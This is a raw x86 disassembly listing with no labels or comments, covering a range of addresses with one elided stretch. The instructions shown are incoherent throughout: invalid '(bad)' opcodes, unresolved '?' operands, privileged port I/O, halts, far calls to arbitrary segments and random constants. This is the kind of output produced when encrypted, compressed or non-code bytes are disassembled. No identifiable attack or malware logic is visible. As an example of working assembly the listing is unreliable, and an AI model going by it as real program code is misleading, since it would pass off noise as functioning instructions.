  41f1f8:	pushf  
  41f1f9:	dec    edx
  41f1fa:	sub    al,BYTE PTR [ebx]
  41f1fc:	or     al,0x30
  41f1fe:	and    al,0x4d
  41f200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f201:	stc    
  41f202:	bound  edi,QWORD PTR [ebp-0x6b6ab4f5]
  41f208:	fsubr  DWORD PTR [esi-0xe]
  41f20b:	out    0xc6,eax
  41f20d:	mov    ah,dh
  41f20f:	dec    ecx
  41f210:	aas    
  41f211:	pusha  
  41f212:	inc    eax
  41f213:	daa    
  41f214:	jge    0x41f19b
  41f216:	ds ja  0x41f200
  41f219:	jecxz  0x41f1cd
  41f21b:	(bad)  
  41f21c:	push   esi
  41f21d:	add    al,0xc6
  41f21f:	or     ebx,DWORD PTR [ebx-0x2d]
  41f222:	mov    edi,0x6c4ff917
  41f227:	push   cs
  41f228:	sbb    eax,0xa5cb7cbb
  41f22d:	xor    eax,0xa35663c3
  41f232:	xor    BYTE PTR [edx-0x1],0xb9
  41f236:	pop    ecx
  41f237:	pop    ebx
  41f238:	cli    
  41f239:	pop    eax
  41f23a:	stos   BYTE PTR es:[edi],al
  41f23b:	cmp    esp,DWORD PTR [ebx+0x25]
  41f23e:	jns    0x41f22f
  41f240:	xchg   edi,eax
  41f241:	imul   eax,DWORD PTR [ecx-0x60],0xbb09b16c
  41f248:	mov    WORD PTR [esi+0x78],ss
  41f24b:	ficom  WORD PTR [esi+0x1e]
  41f24e:	ss inc ebp
  41f250:	cmp    bh,BYTE PTR [esi+0x2eda053]
  41f256:	test   BYTE PTR [esi-0x51],0x8a
  41f25a:	stos   BYTE PTR es:[edi],al
  41f25b:	cmp    eax,0x6d24f484
  41f260:	rcr    BYTE PTR [eax],1
  41f262:	mov    ds:0x2e537da9,eax
  41f267:	fld    DWORD PTR [esi-0x7a]
  41f26a:	ret    0x6e36
  41f26d:	xchg   ebp,eax
  41f26e:	mov    bl,BYTE PTR [ecx-0x59549b37]
  41f274:	sbb    al,0xaa
  41f276:	pusha  
  41f277:	in     al,0x46
  41f279:	xor    dh,BYTE PTR [edx]
  41f27b:	xor    eax,0x21e9a06e
  41f280:	dec    ecx
  41f281:	jbe    0x41f22f
  41f283:	xchg   edi,eax
  41f284:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f286:	out    dx,eax
  41f287:	pop    edi
  41f288:	fdiv   DWORD PTR [ecx+0x1e]
  41f28b:	add    DWORD PTR [ebp+0x478a896b],ecx
  41f291:	(bad)  es:[esi+ebp*2-0x28]
  41f296:	xor    eax,0x50f85b0a
  41f29b:	mov    eax,0x73270c2c
  41f2a0:	das    
  41f2a1:	cmp    DWORD PTR [ecx-0x1291b395],ebp
  41f2a7:	mov    dh,0x13
  41f2a9:	jae    0x41f266
  41f2ab:	xchg   esi,eax
  41f2ac:	sbb    BYTE PTR [ebx+0x71],0xc
  41f2b0:	and    eax,0xaed990b4
  41f2b5:	inc    esp
  41f2b6:	scas   eax,DWORD PTR es:[edi]
  41f2b7:	popf   
  41f2b8:	fldenv [ecx+0x4c]
  41f2bb:	push   ss
  41f2bc:	adc    DWORD PTR [eax+0x5e],edx
  41f2bf:	iret   
  41f2c0:	outs   dx,DWORD PTR ds:[esi]
  41f2c1:	ds pop ss
  41f2c3:	(bad)  
  41f2c4:	leave  
  41f2c5:	jle    0x41f26d
  41f2c7:	lea    esi,[esi-0x6cf2c708]
  41f2cd:	js     0x41f2be
  41f2cf:	pop    ecx
  41f2d0:	cmp    eax,0x5a8d4dfa
  41f2d5:	repz sbb al,0xfe
  41f2d8:	mov    dh,0xe1
  41f2da:	mov    edx,0xd1a504bd
  41f2df:	aas    
  41f2e0:	jmp    0x41f313
  41f2e2:	test   al,0x92
  41f2e4:	fs mov bh,0x5f
  41f2e7:	jnp    0x41f2ef
  41f2e9:	add    DWORD PTR [edx],eax
  41f2eb:	add    eax,0x679fb919
  41f2f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2f2:	clc    
  41f2f3:	push   es
  41f2f4:	retf   0x717c
  41f2f7:	pop    ecx
  41f2f8:	pusha  
  41f2f9:	inc    ebx
  41f2fa:	nop
  41f2fb:	jl     0x41f30d
  41f2fd:	(bad)  
  41f2fe:	rcr    BYTE PTR [esi-0x48854e34],cl
  41f304:	aaa    
  41f305:	jnp    0x41f34a
  41f307:	shl    BYTE PTR [eax-0x77],1
  41f30a:	scas   eax,DWORD PTR es:[edi]
  41f30b:	stos   DWORD PTR es:[edi],eax
  41f30c:	cmp    esp,DWORD PTR [esi*4-0x152b54db]
  41f313:	jno    0x41f2de
  41f315:	outs   dx,BYTE PTR ds:[esi]
  41f316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f317:	cmp    bh,ch
  41f319:	jae    0x41f2b6
  41f31b:	sub    DWORD PTR [edi+ecx*1+0x46073ba6],esp
  41f322:	jge    0x41f308
  41f324:	imul   ebx,DWORD PTR [edx-0x5f],0xffffffbd
  41f328:	bound  eax,QWORD PTR [esi+0x4]
  41f32b:	ja     0x41f2fd
  41f32d:	cmp    BYTE PTR [ecx],0x2c
  41f330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f331:	hlt    
  41f332:	jo     0x41f352
  41f334:	or     eax,0x6b6467d8
  41f339:	mov    al,ds:0x5597f904
  41f33e:	mov    ?,WORD PTR [ebx]
  41f340:	call   0xcde83032
  41f345:	mov    ah,BYTE PTR [ebx]
  41f347:	cmp    eax,0xb54b9a0
  41f34c:	(bad)  
  41f34d:	hlt    
  41f34e:	pop    edi
  41f34f:	imul   ebx,DWORD PTR es:[edx+ecx*1+0x44],0x5c426327
  41f358:	fimul  WORD PTR [eax+0x17b20b22]
  41f35e:	add    eax,0xaa10e649
  41f363:	pop    edx
  41f364:	xchg   esi,eax
  41f365:	dec    ecx
  41f366:	cli    
  41f367:	jmp    0x41f3e6
  41f369:	test   eax,0x26853a21
  41f36e:	leave  
  41f36f:	int    0x8b
  41f371:	xchg   al,dl
  41f373:	adc    edx,edx
  41f375:	pop    esp
  41f376:	in     al,0x32
  41f378:	jg     0x41f3e4
  41f37a:	xor    al,BYTE PTR [esi-0x1]
  41f37d:	sti    
  41f37e:	xor    eax,0x487dbb4a
  41f383:	dec    eax
  41f384:	adc    eax,0x868d7533
  41f389:	xchg   ebx,eax
  41f38a:	ror    DWORD PTR [ecx+0x15],0xbc
  41f38e:	push   ds
  41f38f:	aaa    
  41f390:	daa    
  41f391:	fcomp  QWORD PTR [ecx-0x60]
  41f394:	lock xlat BYTE PTR ds:[ebx]
  41f396:	aam    0x23
  41f398:	retf   0xb93f
  41f39b:	ja     0x41f3ae
  41f39d:	das    
  41f39e:	popf   
  41f39f:	sub    bh,BYTE PTR [ebx+0x4507c6f5]
  41f3a5:	sar    dl,cl
  41f3a7:	mov    eax,0x128bd58d
  41f3ac:	int3   
  41f3ad:	xor    esi,esi
  41f3af:	outs   dx,DWORD PTR ds:[esi]
  41f3b0:	popa   
  41f3b1:	jl     0x41f375
  41f3b3:	(bad)  
  41f3b4:	test   al,0x81
  41f3b6:	aaa    
  41f3b7:	mov    cs,WORD PTR [edi]
  41f3b9:	leave  
  41f3ba:	push   eax
  41f3bb:	loopne 0x41f400
  41f3bd:	pop    ds
  41f3be:	fsubrp st(6),st
  41f3c0:	aas    
  41f3c1:	jo     0x41f36d
  41f3c3:	dec    esp
  41f3c4:	xor    eax,0xe39e15e2
  41f3c9:	push   eax
  41f3ca:	aam    0x1c
  41f3cc:	cmp    DWORD PTR [edx+ebp*4],esi
  41f3cf:	push   cs
  41f3d0:	(bad)  [edi+0x26]
  41f3d3:	inc    ebx
  41f3d4:	mov    ch,ch
  41f3d6:	arpl   WORD PTR [ebx-0x59d9fa07],bp
  41f3dc:	outs   dx,DWORD PTR ds:[esi]
  41f3dd:	imul   esi,edx,0xffffffcc
  41f3e0:	fwait
  41f3e1:	out    0xc3,al
  41f3e3:	add    ch,cl
  41f3e5:	out    dx,al
  41f3e6:	addr16 sbb eax,0x8ff0f1d4
  41f3ec:	ss sub edi,ecx
  41f3ef:	lock mov cl,0x47
  41f3f2:	in     al,dx
  41f3f3:	mul    BYTE PTR [ebp-0x12831e88]
  41f3f9:	xor    al,0x94
  41f3fb:	std    
  41f3fc:	je     0x41f45a
  41f3fe:	jg     0x41f40e
  41f400:	(bad)  
  41f401:	fld    st(4)
  41f403:	(bad)  
  41f405:	enter  0x21a9,0x85
  41f409:	and    dl,dl
  41f40b:	shl    DWORD PTR [edi-0x7e],0x1f
  41f40f:	jg     0x41f394
  41f411:	nop
  41f412:	shl    ah,0xf4
  41f415:	jo     0x41f44d
  41f417:	(bad)  
  41f419:	ja     0x41f46a
  41f41b:	js     0x41f3a4
  41f41d:	test   DWORD PTR [ecx],0x1d7a2d7a
  41f423:	lea    edi,[esi]
  41f425:	jle    0x41f3f0
  41f427:	shr    DWORD PTR [edi],0xf1
  41f42a:	loope  0x41f463
  41f42c:	bound  ebp,QWORD PTR [eax+0x4]
  41f42f:	imul   esp,ebp,0x64
  41f432:	ds dec edi
  41f434:	and    BYTE PTR [eax-0x6e5547ff],dh
  41f43a:	xor    bh,BYTE PTR [ebx+0x56]
  41f43d:	scas   eax,DWORD PTR es:[edi]
  41f43e:	mov    eax,0x2949fadc
  41f443:	inc    ebx
  41f444:	xor    eax,0x974d6f2
  41f449:	push   ecx
  41f44a:	pop    ds
  41f44b:	push   edx
  41f44c:	bound  ebx,QWORD PTR [eax]
  41f44e:	(bad)  
  41f44f:	sti    
  41f450:	fidiv  DWORD PTR [edx-0x3ed98084]
  41f456:	cmp    edx,DWORD PTR [ecx+eax*1-0x3c]
  41f45a:	dec    edi
  41f45b:	lock in al,dx
  41f45d:	jl     0x41f442
  41f45f:	or     eax,0x1316d8cc
  41f464:	pushf  
  41f465:	test   DWORD PTR [ecx],ecx
  41f467:	jb     0x41f452
  41f469:	cwde   
  41f46a:	hlt    
  41f46b:	test   al,0x75
  41f46d:	push   ss
  41f46e:	in     eax,dx
  41f46f:	in     eax,dx
  41f470:	sub    DWORD PTR [eax+0x7d30c654],0xffffffff
  41f477:	(bad)
  41f47b:	cmp    ebx,DWORD PTR [ecx+0x63b38728]
  41f481:	sar    BYTE PTR [esi],cl
  41f483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f484:	sub    edx,DWORD PTR [esi]
  41f486:	jno    0x41f449
  41f488:	in     al,0x90
	...
  41f662:	xchg   edi,edx
  41f664:	dec    ebp
  41f665:	jnp    0x41f6c4
  41f667:	sti    
  41f668:	mov    bh,0xff
  41f66a:	ds aad 0x54
  41f66d:	ret    0x7dbb
  41f670:	sbb    esi,eax
  41f672:	cmc    
  41f673:	call   0x0:0x7220001
  41f67a:	or     eax,0x52e078ea
  41f67f:	cmp    ecx,DWORD PTR [esi]
  41f681:	adc    esp,DWORD PTR [eax+0x10]
  41f684:	out    dx,al
  41f685:	aam    0xae
  41f687:	lahf   
  41f688:	scas   al,BYTE PTR es:[edi]
  41f689:	ror    DWORD PTR fs:[esi+0x7f500a98],1
  41f690:	dec    edi
  41f691:	xchg   BYTE PTR [edi-0x198d6961],al
  41f697:	imul   BYTE PTR [ebx+0x50a9e742]
  41f69d:	lea    esp,[eax-0x41b42b62]
  41f6a3:	bound  eax,QWORD PTR [edx+0x5c]
  41f6a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6a7:	into   
  41f6a8:	xchg   esi,eax
  41f6a9:	imul   ebp,DWORD PTR [ebp+0x1b],0xffffffc7
  41f6ad:	sar    BYTE PTR [ecx+0x57],0xdc
  41f6b1:	pop    ebp
  41f6b2:	cmp    DWORD PTR [eax-0x2aae2eab],eax
  41f6b8:	or     DWORD PTR [edx-0x3934b37a],esp
  41f6be:	xor    BYTE PTR [ecx+0x16],dh
  41f6c1:	pop    edx
  41f6c2:	and    edx,DWORD PTR [eax+0x5697d61a]
  41f6c8:	sub    DWORD PTR [edx-0x7],edi
  41f6cb:	jle    0x41f742
  41f6cd:	inc    ecx
  41f6ce:	js     0x41f6b5
  41f6d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6d1:	push   eax
  41f6d2:	add    dh,BYTE PTR [ebp+0x201f7aae]
  41f6d8:	push   cs
  41f6d9:	jle    0x41f6cf
  41f6db:	push   es
  41f6dc:	push   esi
  41f6dd:	icebp  
  41f6de:	jecxz  0x41f685
  41f6e0:	imul   edx,edx,0xffffff82
  41f6e3:	cs sub ecx,edx
  41f6e6:	daa    
  41f6e7:	scas   eax,DWORD PTR es:[edi]
  41f6e8:	sbb    BYTE PTR [ebx-0x126f6b40],0xd5
  41f6ef:	mov    eax,0xf8839e11
  41f6f4:	mov    al,ds:0x5b06af3
  41f6f9:	cld    
  41f6fa:	inc    edi
  41f6fb:	pop    ds
  41f6fc:	jae    0x41f695
  41f6fe:	mov    dh,0x54
  41f700:	inc    edx
  41f701:	iret   
  41f702:	push   esi
  41f703:	jp     0x41f722
  41f705:	jecxz  0x41f702
  41f707:	sub    bh,BYTE PTR [ecx+0x47]
  41f70a:	sub    ah,al
  41f70c:	or     eax,0xe9898314
  41f711:	add    DWORD PTR [eax-0x657f2e2],eax
  41f717:	lock les ebx,FWORD PTR [ebp+0x50]
  41f71b:	retf   0xf8f9
  41f71e:	fisttp DWORD PTR [ebx+ebx*2-0x69]
  41f722:	call   0xf170:0x4b4fc6f4
  41f729:	daa    
  41f72a:	push   edi
  41f72b:	int    0x84
  41f72d:	hlt    
  41f72e:	(bad)  
  41f730:	jp     0x41f70a
  41f732:	mov    edx,0x78bff0e5
  41f737:	mov    cl,BYTE PTR [ebx+ecx*4]
  41f73a:	arpl   WORD PTR [ebp-0x509b6019],dx
  41f740:	mov    eax,0xb2eec445
  41f745:	sub    BYTE PTR [eax+0xe],cl
  41f748:	stos   DWORD PTR es:[edi],eax
  41f749:	adc    esp,DWORD PTR [ecx-0x36]
  41f74c:	and    al,0xbc
  41f74e:	or     esp,esp
  41f750:	dec    ecx
  41f751:	jle    0x41f7b4
  41f753:	jae    0x41f6ec
  41f755:	pop    ss
  41f756:	push   cs
  41f757:	sbb    bl,ah
  41f759:	add    BYTE PTR [esi],dh
  41f75b:	cmp    al,0xe6
  41f75d:	shl    BYTE PTR [ecx],cl
  41f75f:	je     0x41f6f1
  41f761:	mov    cl,ch
  41f763:	outs   dx,BYTE PTR ds:[esi]
  41f764:	or     dl,ah
  41f766:	hlt    
  41f767:	leave  
  41f768:	adc    DWORD PTR [ebp+eax*4+0x6e],0xf020c357
  41f770:	mov    ch,0x1b
  41f772:	retf   
  41f773:	or     DWORD PTR [esi],esp
  41f775:	xor    DWORD PTR [edx+0x38],esi
  41f778:	(bad)  
  41f779:	mov    esi,0x6220215b
  41f77e:	xchg   BYTE PTR ds:0x814a8bbe,dh
  41f784:	cmp    eax,0xf6819926
  41f789:	cld    
  41f78a:	push   eax
  41f78b:	daa    
  41f78c:	jg     0x41f76c
  41f78e:	or     al,0xd7
  41f790:	cmp    eax,eax
  41f792:	aad    0x9b
  41f794:	lock sub bl,bh
  41f797:	push   cs
  41f798:	mov    ebp,DWORD PTR [ecx+0x1]
  41f79b:	xchg   esi,eax
  41f79c:	arpl   WORD PTR [edi+0x1],sp
  41f79f:	sar    BYTE PTR [ecx-0x5e533523],0x7d
  41f7a6:	mov    cl,0x2b
  41f7a8:	inc    esp
  41f7a9:	cmp    al,0x90
  41f7ab:	xchg   BYTE PTR [edx],cl
  41f7ad:	pop    edx
  41f7ae:	xchg   esi,eax
  41f7af:	xlat   BYTE PTR ds:[ebx]
  41f7b0:	inc    ecx
  41f7b1:	ins    DWORD PTR es:[edi],dx
  41f7b2:	jnp    0x41f82e
  41f7b4:	sub    bh,BYTE PTR [edx]
  41f7b6:	xchg   ebp,eax
  41f7b7:	pop    eax
  41f7b8:	jmp    0x6a94:0xf6c59b9a
  41f7bf:	jbe    0x41f79c
  41f7c1:	mul    BYTE PTR [edx+ecx*4]
  41f7c4:	iret   
  41f7c5:	clc    
  41f7c6:	setbe  cl
  41f7c9:	cmp    ebx,DWORD PTR [esp+ecx*4+0x6c]
  41f7cd:	shl    esi,0x69
  41f7d0:	je     0x41f7a6
  41f7d2:	lahf   
  41f7d3:	or     al,0x9c
  41f7d5:	mov    edx,0x6131cefa
  41f7da:	push   edi
  41f7db:	mov    dh,dh
  41f7dd:	jl     0x41f84c
  41f7df:	inc    edx
  41f7e0:	inc    edx
  41f7e1:	sbb    bh,BYTE PTR [edi-0x5]
  41f7e4:	leave  
  41f7e5:	stc    
  41f7e6:	imul   eax
  41f7e8:	and    DWORD PTR [edi+0x33],edi
  41f7eb:	pop    ds
  41f7ec:	mov    al,ds:0x1213cd26
  41f7f1:	inc    esi
  41f7f2:	cmc    
  41f7f3:	pop    ecx
  41f7f4:	dec    edx
  41f7f5:	pop    ecx
  41f7f6:	imul   ecx,DWORD PTR [ebx-0x6d],0xffffffb4
  41f7fa:	outs   dx,BYTE PTR ds:[esi]
  41f7fb:	sbb    al,0xc8
  41f7fd:	mov    eax,ds:0x14877a2c
  41f802:	xor    eax,0xe82b9fdb
  41f807:	or     ecx,DWORD PTR [ebx-0x3c30fdf7]
  41f80d:	pop    eax
  41f80e:	scas   al,BYTE PTR es:[edi]
  41f80f:	jnp    0x41f872
  41f811:	sub    BYTE PTR [eax],bh
  41f813:	push   0x15b7ffce
  41f818:	or     eax,0x8dfb9bb
  41f81d:	push   edi
  41f81e:	imul   eax,DWORD PTR [ebx-0x74393402],0xfffffffe
  41f825:	cli    
  41f826:	cwde   
  41f827:	sub    BYTE PTR [esi-0x2a],0x72
  41f82b:	adc    esi,eax
  41f82d:	xor    DWORD PTR ss:[bx-0x55],ecx
  41f832:	dec    eax
  41f833:	xchg   edx,eax
  41f834:	mov    esp,esp
  41f836:	jp     0x41f7cd
  41f838:	push   edi
  41f839:	cmc    
  41f83a:	arpl   WORD PTR [ecx-0x17],di
  41f83d:	pop    es
  41f83e:	mul    BYTE PTR [edi-0x29]
  41f841:	pop    es
  41f842:	or     BYTE PTR [edi-0xa57383f],bh
  41f848:	imul   esp,esi,0x475da44e
  41f84e:	out    dx,eax
  41f84f:	or     DWORD PTR [edx-0x24],edi
  41f852:	inc    ebp
  41f853:	repz sbb ecx,DWORD PTR [esi+0x2828ce25]
  41f85a:	and    eax,DWORD PTR ds:0x7a47f8e3
  41f860:	lods   al,BYTE PTR ds:[esi]
  41f861:	mov    ch,0x4e
  41f863:	xor    ebx,0x23c14d41
  41f869:	scas   eax,DWORD PTR es:[edi]
  41f86a:	mov    al,ds:0xc0ed6e80
  41f86f:	daa    
  41f870:	jns    0x41f84c
  41f872:	call   0x4397:0xbb1937d9
  41f879:	and    edi,DWORD PTR ds:0x71b04bf3
  41f87f:	mov    ecx,es
  41f881:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f882:	push   ecx
  41f883:	cs jp  0x41f864
  41f886:	add    eax,edi
  41f888:	ret    0x4572
  41f88b:	xor    cl,BYTE PTR [ebx]
  41f88d:	push   eax
  41f88e:	enter  0xfd94,0xd6
  41f892:	out    dx,eax
  41f893:	jg     0x41f816
  41f895:	pusha  
  41f896:	xor    edx,0x2b
  41f899:	scas   al,BYTE PTR es:[edi]
  41f89a:	fbld   TBYTE PTR [ebx+0x33df77da]
  41f8a0:	xlat   BYTE PTR ds:[ebx]
  41f8a1:	imul   bh
  41f8a3:	and    BYTE PTR [eax-0x271ded2d],ch
  41f8a9:	in     al,0xa1
  41f8ab:	(bad)  
  41f8ac:	aaa    
  41f8ad:	add    edx,DWORD PTR [edi+0x2ff09a19]
  41f8b3:	mov    al,ds:0x242fb886
  41f8b8:	adc    DWORD PTR [eax+0x1a80d168],0xc6093078
  41f8c2:	jl     0x41f922
  41f8c4:	jecxz  0x41f90f
  41f8c6:	fs stos BYTE PTR es:[edi],al
  41f8c8:	and    ch,BYTE PTR [edi+0xce9818]
  41f8ce:	inc    eax
  41f8cf:	pop    ebx
  41f8d0:	mov    al,ds:0x822c82f6
  41f8d5:	and    DWORD PTR [ecx],0x4f
  41f8d8:	and    ecx,DWORD PTR ds:0xa101fad4
  41f8de:	xchg   ebx,eax
  41f8df:	sbb    eax,0x6bfbfd1d
  41f8e4:	jne    0x41f914
  41f8e6:	xlat   BYTE PTR ds:[ebx]
  41f8e7:	mov    ebx,0xa7c2889a
  41f8ec:	pop    ecx
  41f8ed:	cdq    
  41f8ee:	in     al,0x4d
  41f8f0:	sbb    eax,0x760872fc
  41f8f5:	stc    
  41f8f6:	mov    DWORD PTR es:[edx+0x3a],esi
  41f8fa:	addr16 mov dl,0x28
  41f8fd:	pop    es
  41f8fe:	push   esp
  41f8ff:	dec    ebx
  41f900:	and    bl,BYTE PTR [eax+0x67eb8b93]
  41f906:	xchg   esi,eax
  41f907:	mov    ebp,DWORD PTR [ebp+0x71]
  41f90a:	fnstsw WORD PTR [ebx-0x75aadde2]
  41f910:	or     al,0xe8
  41f912:	(bad)  
  41f913:	outs   dx,DWORD PTR ds:[esi]
  41f914:	and    cl,BYTE PTR [eax-0x79]
  41f917:	add    esp,DWORD PTR [ebx+0x6]
  41f91a:	or     dh,BYTE PTR cs:[edx+0x29ff06ca]
  41f921:	call   0x40fa:0x28e8eb69
  41f928:	pop    ss
  41f929:	adc    esp,DWORD PTR [ecx-0x75a0fb12]
  41f92f:	xor    ebp,DWORD PTR [esi-0x14547c4b]
  41f935:	gs sti 
  41f937:	fld    QWORD PTR [eax]
  41f939:	jecxz  0x41f8d7
  41f93b:	add    BYTE PTR ds:0xe94c054,bl
  41f941:	es jecxz 0x41f970
  41f944:	leave  
  41f945:	cmc    
  41f946:	jns    0x41f94d
  41f948:	dec    edx
  41f949:	xchg   ebp,eax
  41f94a:	xchg   BYTE PTR [esi-0x34],bl
  41f94d:	pop    ebp
  41f94e:	stos   DWORD PTR es:[edi],eax
  41f94f:	mov    dh,0xb5
  41f951:	pop    ss
  41f952:	and    ch,BYTE PTR [edx-0x772c940a]
  41f958:	aas    
  41f959:	and    BYTE PTR [ebx+0x1660d014],0xcf
  41f960:	iret   
  41f961:	push   ds
  41f962:	cmp    DWORD PTR [ebx+0x74b25414],ebx
  41f968:	retf   0x70b3
  41f96b:	int    0x1a
  41f96d:	in     al,0x41
  41f96f:	xchg   ebp,eax
  41f970:	add    eax,0x9db51310
  41f975:	popa   
  41f976:	hlt    
  41f977:	iret   
  41f978:	xor    eax,0x828e8d8b
  41f97d:	cmp    dl,BYTE PTR ds:0xdac89596
  41f983:	fdiv   st(2),st
  41f985:	gs cli 
  41f987:	ficom  DWORD PTR [ebp-0x1]
  41f98a:	shl    BYTE PTR [edi-0x69],cl
  41f98d:	(bad)  
  41f98e:	fdivr  QWORD PTR [ebx]
  41f990:	pop    ds
  41f991:	xchg   edx,eax
  41f992:	ss jb  0x41f987
  41f995:	(bad)  
  41f996:	mov    ds:0xc998d195,eax
  41f99b:	cmc    
  41f99c:	xchg   esp,eax
  41f99d:	mov    eax,ds:0x20e78a50
  41f9a2:	popf   
  41f9a3:	fiadd  WORD PTR [esi+0x5e34ada7]
  41f9a9:	add    ah,BYTE PTR [ebx]
  41f9ab:	push   0xffffffe7
  41f9ad:	into   
  41f9ae:	stc    
  41f9af:	icebp  
  41f9b0:	jo     0x41f965
  41f9b2:	outs   dx,DWORD PTR ds:[esi]
  41f9b3:	inc    edi
  41f9b4:	sbb    eax,0xccb9b13c
  41f9b9:	push   0xed215714
  41f9be:	test   eax,0x1ae690d8
  41f9c3:	arpl   WORD PTR [esi-0x14],ax
  41f9c6:	xor    ebp,eax
  41f9c8:	gs test eax,0x542aa16e
  41f9ce:	push   esp
  41f9cf:	jge    0x41f971
  41f9d1:	fwait
  41f9d2:	xlat   BYTE PTR ds:[ebx]
  41f9d3:	jb     0x41fa40
  41f9d5:	mul    BYTE PTR [esp+ebx*2]
  41f9d8:	cmc    
  41f9d9:	mov    ebp,0x354dc18a
  41f9de:	mov    edi,0x7795e4d
  41f9e3:	daa    
  41f9e4:	inc    ebx
  41f9e5:	mov    dl,BYTE PTR [ebx]
  41f9e7:	or     al,0x2d
  41f9e9:	mov    ?,WORD PTR [eax+0x2842be64]
  41f9ef:	push   cs
  41f9f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9f1:	or     DWORD PTR [ecx+0x71f81394],eax
  41f9f7:	adc    al,bl
  41f9f9:	dec    ecx
  41f9fa:	inc    esi
  41f9fb:	lods   al,BYTE PTR ds:[esi]
  41f9fc:	dec    edx
  41f9fd:	mov    ch,BYTE PTR [esi+0x6522e8c]
  41fa03:	pop    ebx
  41fa04:	push   ebp
  41fa06:	xchg   ebp,eax
  41fa07:	push   ss
  41fa08:	imul   esi,DWORD PTR fs:[ecx+0x7f],0x7b534387
  41fa10:	xchg   eax,edx
  41fa12:	dec    ebp
  41fa13:	add    al,0x86
  41fa15:	in     eax,dx
  41fa16:	std    
  41fa17:	cmp    edx,ebp
  41fa19:	xor    ecx,DWORD PTR [ebp+eiz*2-0xcd3e447]
  41fa20:	je     0x41fa19
  41fa22:	shl    BYTE PTR [esi+esi*1+0x22d6b47e],1
  41fa29:	ret    0x6234
  41fa2c:	sub    eax,0xc90fd7ba
  41fa31:	pusha  
  41fa32:	mov    edi,0x43903655
  41fa37:	inc    esi
  41fa38:	adc    DWORD PTR [ebx],ebp
  41fa3a:	pop    edx
  41fa3b:	js     0x41f9c0
  41fa3d:	ficomp WORD PTR ds:[ecx+0x126072b4]
  41fa44:	retf   0xb5b6
  41fa47:	lahf   
  41fa48:	push   esp
  41fa49:	outs   dx,BYTE PTR ds:[esi]
  41fa4a:	out    0xb0,eax
  41fa4c:	ficomp WORD PTR [ebx+0x54882afd]
  41fa53:	fdivr  DWORD PTR [ebp+0x1c]
  41fa56:	out    dx,al
  41fa57:	jmp    0x9ec0:0x1c5b6e0a
  41fa5e:	(bad)  
  41fa5f:	pop    es
  41fa60:	cmp    DWORD PTR [ebx-0x28d2c625],ebp
  41fa66:	inc    esi
  41fa67:	inc    ebp
  41fa68:	pop    edx
  41fa69:	adc    ecx,DWORD PTR [ecx+0x50adb866]
  41fa6f:	pop    edi
  41fa70:	inc    ebp
  41fa71:	adc    eax,0x2cbe9578
  41fa76:	int3   
  41fa77:	mov    esi,0x9722a4ee
  41fa7c:	cs xchg ecx,eax
  41fa7e:	call   0x6c18006b
  41fa83:	aad    0x9d
  41fa85:	pop    ebx
  41fa86:	lods   al,BYTE PTR ds:[esi]
  41fa87:	imul   ebx,DWORD PTR [ebp-0x5377345e],0xce93d847
  41fa91:	cdq    
  41fa92:	inc    edi
  41fa93:	(bad)  
  41fa94:	jecxz  0x41fa25
  41fa96:	inc    ebx
  41fa97:	les    edx,FWORD PTR [ecx]
  41fa99:	xor    bl,0xc7
  41fa9c:	inc    edx
  41fa9d:	rol    BYTE PTR [ecx+0x43],1
  41faa0:	mov    WORD PTR [edx-0x1458414e],?
  41faa6:	mov    ds:0xcf67fa68,eax
  41faac:	test   al,0xa6
  41faae:	fmul   st,st(3)
  41fab0:	fistp  WORD PTR [eax+0x79d7c667]
  41fab6:	rcl    BYTE PTR [ecx],1
  41fab8:	sbb    DWORD PTR [edi-0x2f7d636b],0x80f42c4f
  41fac2:	mov    DWORD PTR [edx],edx
  41fac4:	sbb    esp,DWORD PTR [edx]
  41fac6:	pop    esp
  41fac7:	jl     0x41faea
  41fac9:	ds in  al,0xf8
  41facc:	icebp  
  41facd:	fist   DWORD PTR ds:0x8e927fbc
  41fad3:	sub    DWORD PTR [eax+0x14fc4cb9],ebp
  41fad9:	pop    eax
  41fada:	push   ebp
  41fadb:	mov    dh,0xfe
  41fade:	cwde   
  41fadf:	es mov dl,0xdb
  41fae2:	rcl    ebp,1
  41fae4:	push   esp
  41fae5:	fwait
  41fae6:	movq   QWORD PTR [ebx+0x50bc37c6],mm7
  41faed:	mov    al,0x5d
  41faef:	sbb    ebp,edi
  41faf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faf2:	div    eax
  41faf4:	inc    edx
  41faf5:	cmp    DWORD PTR [edi-0x13],esi
  41faf8:	sub    eax,0xee5052c1
  41fafd:	mov    bl,BYTE PTR [edx+0x57c5e43a]
  41fb03:	jb     0x41fabe
  41fb05:	pop    edi
  41fb06:	mov    al,ds:0xfae870a3
  41fb0b:	push   cs
  41fb0c:	clc    
  41fb0d:	fild   DWORD PTR [ebx-0x339d658b]
  41fb13:	jbe    0x41fb42
  41fb15:	and    esi,DWORD PTR [ecx]
  41fb17:	aaa    
  41fb18:	test   DWORD PTR [eax],esi
  41fb1a:	out    0x22,al
  41fb1c:	or     DWORD PTR [edx-0x2022f5d7],ecx
  41fb22:	mov    esi,0xe1baee39
  41fb27:	repz adc edx,DWORD PTR [eax]
  41fb2a:	push   edx
  41fb2b:	add    BYTE PTR [edx],dl
  41fb2d:	fnstsw WORD PTR [ebp-0x4b3428ce]
  41fb33:	inc    edx
  41fb34:	and    bh,BYTE PTR [eax-0x1a]
  41fb37:	cmc    
  41fb38:	cwde   
  41fb39:	mov    bl,0x42
  41fb3b:	call   0xb0e2:0x6cf6a3ae
  41fb42:	cli    
  41fb43:	bound  ebx,QWORD PTR [ecx+ebp*4-0x42]
  41fb47:	mov    cl,0xcd
  41fb49:	jae    0x41fba4
  41fb4b:	call   DWORD PTR ds:0x36160a0c
  41fb51:	sub    al,0xdb
  41fb53:	or     eax,DWORD PTR [eax-0x714f2d22]
  41fb59:	pop    edx
  41fb5a:	pushf  
  41fb5b:	neg    cl
